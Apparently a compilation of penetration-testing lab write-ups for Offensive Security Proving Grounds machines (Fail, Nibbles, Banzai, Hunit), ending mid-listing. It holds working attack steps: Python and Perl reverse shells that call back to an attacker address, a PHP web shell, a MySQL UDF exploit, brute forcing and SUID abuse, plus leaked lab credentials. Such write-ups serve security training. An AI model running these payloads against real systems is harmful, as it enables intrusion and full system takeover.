Within the jail.conf we can see that `banaction = iptables-multiport`. This gives us a possible target to edit. Open the `action.d/iptables-multiport.conf`.

1

# Option:  actionban

2

# Notes.:  command executed when banning an IP. Take care that the

3

#          command is executed with Fail2Ban user rights.

4

# Tags:    See jail.conf(5) man page

5

# Values:  CMD

6

#

7

actionban = python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.199",53));os.dup2(s.f

8

ileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

9

# Option:  actionunban

10

# Notes.:  command executed when unbanning an IP. Take care that the

11

#          command is executed with Fail2Ban user rights.

12

# Tags:    See jail.conf(5) man page

13

# Values:  CMD

14

#

15

​

Remove the action in the `actionban = ""` and replace it with a python reverse shell. Next, start the netcat reverse shell catcher.

1

kali@kali:~$ sudo nc -lvnp 53

2

[sudo] password for kali: 

3

listening on [any] 53 ...

Now attempted to SSH into the target and fail purposely multiple times. This should trigger the fail2ban action we just edited.

1

kali@kali:~/tools/privesc/linux/linux-smart-enumeration$ ssh fox@192.168.199.126

2

The authenticity of host '192.168.199.126 (192.168.199.126)' can't be established.

3

ECDSA key fingerprint is SHA256:TV71PEPS7AhnnK8K5GqGJm91acGTn5mr9GcVYS7rE1A.

4

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

5

Warning: Permanently added '192.168.199.126' (ECDSA) to the list of known hosts.

6

fox@192.168.199.126's password: 

7

Permission denied, please try again.

8

fox@192.168.199.126's password: 

9

Permission denied, please try again.

10

fox@192.168.199.126's password: 

11

fox@192.168.199.126: Permission denied (publickey,password).

Looking back at the shell…..

1

kali@kali:~$ sudo nc -lvnp 53

2

[sudo] password for kali: 

3

listening on [any] 53 ...

4

connect to [192.168.49.199] from (UNKNOWN) [192.168.199.126] 54672

5

root@fail:/# 

We have a root shell! Now to grab the flag.

1

root@fail:/# whoami

2

whoami

3

root

4

root@fail:/# cd /root

5

cd /root

6

root@fail:/root# ls

7

ls

8

proof.txt

9

root@fail:/root# cat proof.txt

10

cat proof.txt

11

605a78dab66ac8e73494fe7cbb2166f0

Offensive Security Proving Grounds has turned out to be a great platform for staying away from CTFish boxes. CTF boxes are fun, however you will not find those machine challenges as useful in the “real world”. Fail was an easy box to root, but provided a great look at the inner workings of Fail2Ban. Let me know if you run into any [questions](https://www.trenchesofit.com/contact/) on this one.

Until next time, stay safe in the Trenches of IT!
```

# Nibbles  - postgres exploit, RCE with Perl shell
```
# Offensive Security – Proving Grounds – Nibbles Write-up – No Metasploit

Posted on [February 1, 2021](https://www.trenchesofit.com/2021/02/01/offensive-security-proving-grounds-nibbles-write-up-no-metasploit/) by [trenchesofit](https://www.trenchesofit.com/author/trenchesofit/)

![](https://www.trenchesofit.com/wordpress/wp-content/uploads/2021/01/image-33.png)

Nibbles from Offensive Security is a great example of getting root on a box by just “Living off The Land”. This boot to root includes no exploitation scripts and shows the importance of hardening systems before deploying to production. Now, on to the hacking.

## **Reconnaissance**

We start off with a basic nmap scan.

1

kali@kali:~/oscp/offsec/nibbles$ nmap -Pn -sV -sC -oA simple 192.168.192.47

2

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

3

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 21:26 EST

4

Nmap scan report for 192.168.192.47

5

Host is up (0.069s latency).

6

Not shown: 995 filtered ports

7

PORT    STATE  SERVICE      VERSION

8

21/tcp  open   ftp          vsftpd 3.0.3

9

22/tcp  open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

10

| ssh-hostkey: 

11

|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)

12

|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)

13

|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)

14

80/tcp  open   http         Apache httpd 2.4.38 ((Debian))

15

|_http-server-header: Apache/2.4.38 (Debian)

16

|_http-title: Enter a title, displayed at the top of the window.

17

139/tcp closed netbios-ssn

18

445/tcp closed microsoft-ds

19

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

20

​

21

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

22

Nmap done: 1 IP address (1 host up) scanned in 19.15 seconds

First, lets check out what is being hosted on port 80.

![](https://www.trenchesofit.com/wordpress/wp-content/uploads/2021/01/image-31.png)

![](https://www.trenchesofit.com/wordpress/wp-content/uploads/2021/01/image-32.png)

![](https://www.trenchesofit.com/wordpress/wp-content/uploads/2021/01/image-30.png)

Simple web app with practically no interesting functionality other than the possible privilege escalation with Apache 2.4.38. We can take note of this and come back later.

Next, lets look at FTP. A few default logins didn’t work so I quickly set up a simple brute force using hydra.

1

kali@kali:~/oscp/offsec/nibbles$ cat /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

2

anonymous:anonymous

3

root:rootpasswd

4

root:12hrs37

5

ftp:b1uRR3

6

admin:admin

7

localadmin:localadmin

8

admin:1234

9

apc:apc

10

admin:nas

11

Root:wago 

12

---------------------SNIP--------------------------

I split the usernames and passwords into separate .txt files using `awk`. (I realized after the fact that this was unnecessary with a feature within hydra)

1

kali@kali:~/oscp/offsec/nibbles$ hydra -l usernames.txt -p passwords.txt 192.168.192.47 ftp

2

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

3

​

4

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-14 22:00:30

5

[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task

6

[DATA] attacking ftp://192.168.192.47:21/

7

1 of 1 target completed, 0 valid password found

8

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-14 22:00:34

Nothing. Lets enumerate further using all tcp ports in the nmap scan.

1

kali@kali:~/oscp/offsec/nibbles$ nmap -Pn -sV -sC -oA full -p- 192.168.192.47

2

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

3

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 21:39 EST

4

Nmap scan report for 192.168.192.47

5

Host is up (0.068s latency).

6

Not shown: 65529 filtered ports

7

PORT     STATE  SERVICE      VERSION

8

21/tcp   open   ftp          vsftpd 3.0.3

9

22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

10

| ssh-hostkey: 

11

|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)

12

|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)

13

|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)

14

80/tcp   open   http         Apache httpd 2.4.38 ((Debian))

15

|_http-server-header: Apache/2.4.38 (Debian)

16

|_http-title: Enter a title, displayed at the top of the window.

17

139/tcp  closed netbios-ssn

18

445/tcp  closed microsoft-ds

19

5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7

20

| ssl-cert: Subject: commonName=debian

21

| Subject Alternative Name: DNS:debian

22

| Not valid before: 2020-04-27T15:41:47

23

|_Not valid after:  2030-04-25T15:41:47

24

|_ssl-date: TLS randomness does not represent time

25

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

26

​

27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

28

Nmap done: 1 IP address (1 host up) scanned in 174.49 seconds

Alright we have a new port to play with. As always I attempt to connect using default credentials. Lets try this with the postgresql DB on port 5437.

1

kali@kali:~/oscp/offsec/nibbles$ psql -U postgres -p 5437 -h 192.168.192.47

2

Password for user postgres: 

3

psql (12.4 (Debian 12.4-3), server 11.7 (Debian 11.7-0+deb10u1))

4

SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)

5

Type "help" for help.

6

​

7

postgres=#

BINGO! That’s a start. Now lets try and enumerate the file system using pg_ls_dir.

1

postgres=# select pg_ls_dir('./');

2

      pg_ls_dir       

3

----------------------

4

 pg_stat

5

 pg_serial

6

 pg_replslot

7

 pg_xact

8

 global

9

 postgresql.auto.conf

10

 PG_VERSION

11

 pg_commit_ts

12

 postmaster.pid

13

 pg_tblspc

14

 pg_stat_tmp

15

 postmaster.opts

16

 pg_wal

17

 pg_multixact

18

 base

19

 pg_dynshmem

20

 pg_notify

21

 pg_logical

22

 pg_subtrans

23

 pg_twophase

24

 pg_snapshots

25

(21 rows)

This opens up our enumeration scope. Lets check out the users on the system.

1

postgres=# select pg_ls_dir('/etc/passwd');

2

-------------------------------------------------------------------------------------------

3

 root:x:0:0:root:/root:/bin/bash

4

 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

5

 bin:x:2:2:bin:/bin:/usr/sbin/nologin

6

 sys:x:3:3:sys:/dev:/usr/sbin/nologin

7

 sync:x:4:65534:sync:/bin:/bin/sync

8

 games:x:5:60:games:/usr/games:/usr/sbin/nologin

9

 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

10

 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

11

 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

12

 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

13

 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

14

 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

15

 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

16

 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

17

 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

18

 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

19

 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

20

 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

21

 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin

22

 systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin

23

 systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin

24

 systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin

25

 messagebus:x:104:110::/nonexistent:/usr/sbin/nologin

26

 sshd:x:105:65534::/run/sshd:/usr/sbin/nologin

27

 wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash

28

 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

29

 postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

30

 Debian-snmp:x:107:114::/var/lib/snmp:/bin/false

31

 ftp:x:108:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin

Lets see if we can get into Wilson’s home directory.

1

postgres=# select pg_ls_dir('/home/wilson');

2

   pg_ls_dir   

3

---------------

4

 .bash_logout

5

 .gnupg

6

 .bash_history

7

 .profile

8

 local.txt

9

 .bashrc

10

 ftp

11

(7 rows)

Indeed. We see the local.txt.

1

postgres=# COPY temp FROM '/home/wilson/local.txt';

2

COPY 1

3

postgres=# SELECT * FROM temp;

4

---SNIP----

5

 wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash

6

 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

7

 postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

8

 Debian-snmp:x:107:114::/var/lib/snmp:/bin/false

9

 ftp:x:108:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin

10

 67ba59137bef6bca820428cf3146f6cd

Now that we have the user flag, lets get us a reverse shell to make navigating the filesystem a bit easier.

# Foothold

Going back to Google, I found a possible method for RCE [here.](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) The method includes creating a table, copying code to the table (perl reverse shell), then selecting the table to execute the code.

1

postgres=# DROP TABLE IF EXISTS cmd_exec;

2

DROP TABLE

3

postgres=# CREATE TABLE cmd_exec(cmd_output text);

4

CREATE TABLE

5

postgres=# COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$ke

6

y}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.49.192:80");STDIN->fdopen($c,r);$~->fdop

7

en($c,w);while(<>){if($_=~ /(.*)/){system $1;}};''';

8

COPY 0

9

postgres=# SELECT * FROM cmd_exec;

10

 cmd_output 

11

------------

12

(0 rows)

This took many attempts before realizing the only port I could get a reverse shell on was 80. So some firewall rules must be in place to prevent most outgoing traffic.

Start up a netcat listener on port 80.

1

kali@kali:~$ sudo nc -lvnp 80

2

listening on [any] 80 ...

3

connect to [192.168.49.192] from (UNKNOWN) [192.168.192.47] 55162

Connection successful. Upgrade the shell for usability using python.

1

python -c 'import pty; pty.spawn("/bin/bash")'

2

postgres@nibbles:/var/lib/postgresql/11/main$

## Privilege Escalation

Now we have a low privilege shell as postgres. First lets start up a web server to pull down an enumeration script called LinEnum.sh. For this I will be using http.server and opening port 80 on my attacking machine.

1

kali@kali:~/tools/linuxenum$ sudo python3 -m http.server 80

2

[sudo] password for kali: 

3

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

On the victim machine we can now wget the LinEnum script while in a location with write permissions.

1

postgres@nibbles:/tmp$ wget http://192.168.49.192/LinEnum.sh

2

wget http://192.168.49.192/LinEnum.sh

3

--2021-01-13 20:54:24--  http://192.168.49.192/LinEnum.sh

4

Connecting to 192.168.49.192:80... connected.

5

HTTP request sent, awaiting response... 200 OK

6

Length: 46631 (46K) [text/x-sh]

7

Saving to: 'LinEnum.sh'

8

​

9

LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.1s    

10

​

11

2021-01-13 20:54:24 (321 KB/s) - 'LinEnum.sh' saved [46631/46631]

Add execute permissions to the script.

1

postgres@nibbles:/tmp$ chmod +x LinEnum.sh

2

chmod +x LinEnum.sh

Execute LinEnum.sh

1

[-] SUID files:

2

-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device

3

-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign

4

-rwsr-xr-- 1 root messagebus 51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

5

-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn

6

-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd

7

-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd

8

-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh

9

-rwsr-xr-x 1 root root 34896 Jan  7  2019 /usr/bin/fusermount

10

-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp

11

-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su

12

-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount

13

-rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find

14

-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo

15

-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount

16

​

17

​

18

[+] Possibly interesting SUID files:

19

-rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find

Looking through the output we see a possibly interesting SUID file – `/usr/bin/find`. With the ability to run find as a different user we can use this to execute commands as root.

First we create a working file named “trenchesofit”. Then we find trenchesofit and execute the desired command.

1

postgres@nibbles:/tmp$ touch trenchesofit

2

postgres@nibbles:/tmp$ find trenchesofit -exec "whoami" \;

3

find trenchesofit -exec "whoami" \;                                                                                   

4

root

Here we see the command executed as root so we should be able to grab the root flag by just using cat.

1

postgres@nibbles:/tmp$ find trenchesofit -exec cat /root/proof.txt \;                                                

2

find trenchesofit -exec cat /root/proof.txt \;                                                                     

3

91aa7b2cee9c2d2476f9f3e3840c44d7

There we are, the root flag.

# Conclusion

In conclusion, Nibbles from Offensive Security was a great learning experience for how postgresql access can lead from local file access to remote code execution. Again, no additional tools were needed to get root. We did however use one enumeration script that was wasn’t required, but did speed up the process.

From a defenders standpoint, detection of this movement would require proper database auditing and outbound network restrictions or anomaly detection.

**Harden those systems, and until next time, stay safe in the Trenches of IT!**
```

# Banzai - UDF
```
Name: Offensive Security PG Practice – Banzai  
URL: [https://portal.offensive-security.com/proving-grounds/practice](https://portal.offensive-security.com/proving-grounds/practice)  
Release Date: 03 Sep 2020  
Author: OffSec  
Difficulty Stated: Intermediate  
Difficulty I found: Intermediate  
CTF or Real-life: Kind of Real life  
Learning out of box : Good  
OS used: KaliLinux 2021.2  
Things you can learn from this VM: Enumeration, Default credentials vulnerability, Reverse shell, Privilege escalation MySQL User-Defined Function (UDF) Dynamic Library exploitation.

**nmap** found a lot of open TCP ports.

1

`nmap -r -``v` `--min-rate=1500 -p- -oN 001-nmap-full 192.168.74.56`

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_09-56.png?w=761)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_09-56.png)

Tried common default credentials for postgres (5432) but no success in it.

1

`psql -h 192.168.140.56 -p 5432 -U admin -W`

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_21-16.png?w=1024)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_21-16.png)

**gobuster** for web servers on port **8295** and **8080** also didn;t give us anything fruitful.

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_21-17.png?w=1024)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_21-17.png)

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_21-17_1.png?w=811)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_21-17_1.png)

We tried default credentials for **FTP** “admin:admin” and got in. ^_^

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-19.png?w=740)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-19.png)

As we were in web directory, so we uploaded a malicious php file myrce.php.

1

`<?php system(``$_GET``[``'cmd'``]); ?>`

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-20_1.png?w=745)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-20_1.png)

And we got **RCE** (remote code execution).

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-20.png?w=806)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-20.png)

Grabbed a python based reverse shell from [here](https://www.revshells.com/) and popped the box .

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-24.png?w=688)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-24.png)

Read the local flag.

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-27.png?w=549)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-27.png)

We found that mysql is running as root user.

1

`ps` `-aux |` `grep` `root |` `grep` `sql`

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-43.png?w=1024)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-43.png)

And we had credentials of mysql in a file .

1

2

3

4

5

6

`<?php`

`define(``'DBHOST'``,` `'127.0.0.1'``);`

`define(``'DBUSER'``,` `'root'``);`

`define(``'DBPASS'``,` `'EscalateRaftHubris123'``);`

`define(``'DBNAME'``,` `'main'``);`

`?>`

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-26.png?w=611)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-26.png)

Now, we’ll load the **raptor_udf** library for code execution from [here](https://www.exploit-db.com/exploits/1181).

Download the raptor c file to Banzai & compile it.

1

2

`gcc` `-g -c raptor_udf.c`

`gcc` `-g -shared -Wl,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc`

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-49.png?w=1024)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-49.png)

Next login to **mysql** and perform following steps.

1

2

3

4

5

6

`use mysql;`

`create table foo(line blob);`

`insert into foo values(load_file('/dev/shm/raptor_udf2.so'));`

`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`

`select * from mysql.func;`

`select do_system('chmod 777 /etc/passwd');`

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-57.png?w=884)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-57.png)

Now, anyone can modify **/etc/passwd** file. So, we will add a new user **skinny1** with password **123** as **root** level privileges.

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-59.png?w=1024)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_20-59.png)

Read the root flag.

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_21-00.png?w=506)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-08_21-00.png)
```

# Hunit - git shell exploit
# Exploitation Guide for Hunit

## Summary

In this scenario, we'll enumerate a web application and discover an API endpoint that leaks user information. This helps us obtain SSH access as a low-privileged user. We'll then find and extract a private SSH key for the `git` user, gaining privileges to push arbitrary updates to the `master` branch of a local repository. To escalate our privileges, we will clone the repository to our attack machine and inject a malicious payload using the `git` account.

## Enumeration

### Nmap

We'll begin with an `nmap` scan against all TCP ports.

```
kali@kali:~$ sudo nmap -p- 192.168.120.204
...
Nmap scan report for 192.168.120.204
PORT      STATE SERVICE
8080/tcp  open  http-proxy
12445/tcp open  unknown
18030/tcp open  unknown
43022/tcp open  unknown
```

Next, we'll run a more detailed "version" scan against the open ports.

```
kali@kali:~$  sudo nmap -sC -sV -p 8080,12445,18030,43022 192.168.120.204
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 16:39 -03
Nmap scan report for 192.168.120.204
Host is up (0.16s latency).

PORT      STATE SERVICE     VERSION
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3755
|     Date: Mon, 09 Nov 2020 19:39:31 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 09 Nov 2020 19:39:31 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Mon, 09 Nov 2020 19:39:31 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: My Haikus
12445/tcp open  netbios-ssn Samba smbd 4.6.2
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: Whack A Mole!
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
```

This reveals a web server on port 8080, a Samba share on port 12445, an Apache web server on port 18030, and SSH on port 43022. In this case we'll focus on the web server on port 8080 and the SSH service.

### CURL

Let's start by enumerating the website on port 8080. The default page (http://192.168.120.204:8080/) contains several links, the first of which points to **/article/the-taste-of-rain**.

```
kali@kali:~$ curl http://192.168.120.204:8080/
...
<section>
        <header class="article-header">
                <h2 class="article-title"><a href="/article/the-taste-of-rain">The Taste of Rain</a></h2>
                <div class="article-meta">By  <strong>James</strong>, on <strong>2021-01-14 14th 2021</strong></div>
        </header>
        <div class="article-headline">
                Jack Kerouac
        </div>
</section>
...
```

Let's follow that link.

```
kali@kali:~$ curl http://192.168.120.204:8080/article/the-taste-of-rain
...
<section class="article">
	<header class="article-header">
		<h1 class="article-title">The Taste of Rain</h1>
		<p class="article-meta">By  <strong>James</strong>, on <strong>2020-11-09 9th 2020</strong></p>
	</header>

	<div class="article-description">
		<div>Jack Kerouac</div>
		
		
		

		<p>The taste, Of rain, —Why kneel?</p>
	</div>
</section>

<!--
<a href="http://localhost:8080/api/">List all</a>
-->
...
```

A comment on the page suggests the presence of an API located in the **/api/** directory.

## Exploitation

### Credential Leak

After a brief exploration of the API, we discover an information leak.

```
kali@kali:~$ curl http://192.168.120.204:8080/api/         
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}]        
```

The **/user/** endpoint is certainly worth inspection.

```
kali@kali:~$ curl http://192.168.120.204:8080/api/user/
[{"login":"rjackson","password":"yYJcgYqszv4aGQ","firstname":"Richard","lastname":"Jackson","description":"Editor","id":1},
{"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},
{"login":"dademola","password":"ExplainSlowQuest110","firstname":"Derik","lastname":"Ademola","description":"Admin","id":6},
{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},
{"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10}]%  
```

This endpoint leaks several username-password pairs.

### SSH

Let's try to leverage these credentials against the SSH service running on port 43022 in an attempt to gain an initial foothold.

```
kali@kali:~$ ssh -p 43022 dademola@192.168.120.204
...
dademola@192.168.120.204's password: 
[dademola@hunit ~]$ id
uid=1001(dademola) gid=1001(dademola) groups=1001(dademola)
[dademola@hunit ~]$
```

The `dademola:ExplainSlowQuest110` credentials grant us access. We have our foothold!

## Escalation

### Crontab Backup File Enumeration

After some initial enumeration, we discover a crontab backup in the **/etc** folder.

```
[dademola@hunit ~]$ ls -l /etc
total 780
...
drwxr-xr-x 2 root root   4096 Nov  6 18:09 conf.d
drwxr-xr-x 2 root root   4096 Nov  5 23:46 cron.d
drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.daily
-rw-r--r-- 1 root root     74 Oct 31  2019 cron.deny
drwxr-xr-x 2 root root   4096 Nov  5 23:46 cron.hourly
drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.monthly
drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.weekly
-rw-r--r-- 1 root root     67 Nov 10 15:31 crontab.bak
...
```

The contents of the **/etc/crontab.bak** file are certainly interesting:

```
[dademola@hunit ~]$ cat /etc/crontab.bak 
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
[dademola@hunit ~]$ 
```

This file lists two jobs that are run from the **/root** directory. This is obviously a potential vulnerability which requires further examination.

### Git Server Enumeration

As is typical, any attempt to access **/root** as this user generates a "permission denied" error. However, we do discover that **git-server** exists in **/**.

```
[dademola@hunit ~]$ find / -type d -name git-server -print 2>/dev/null
/git-server
[dademola@hunit ~]$ 
[dademola@hunit ~]$ ls -l /git-server/
total 32
-rw-r--r--  1 git git   23 Nov  5 22:33 HEAD
drwxr-xr-x  2 git git 4096 Nov  5 22:33 branches
-rw-r--r--  1 git git   66 Nov  5 22:33 config
-rw-r--r--  1 git git   73 Nov  5 22:33 description
drwxr-xr-x  2 git git 4096 Nov  5 22:33 hooks
drwxr-xr-x  2 git git 4096 Nov  5 22:33 info
drwxr-xr-x 16 git git 4096 Nov  6 00:06 objects
drwxr-xr-x  4 git git 4096 Nov  5 22:33 refs
```

Inspecting these files, we discover that they are git backend files, which are somewhat difficult to work with. Let's instead attempt to clone **/git-server** to determine what's inside.

```
[dademola@hunit ~]$ git clone file:///git-server/ 
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

This works. Let's inspect the directory contents.

```
[dademola@hunit ~]$ ls -la git-server
total 20
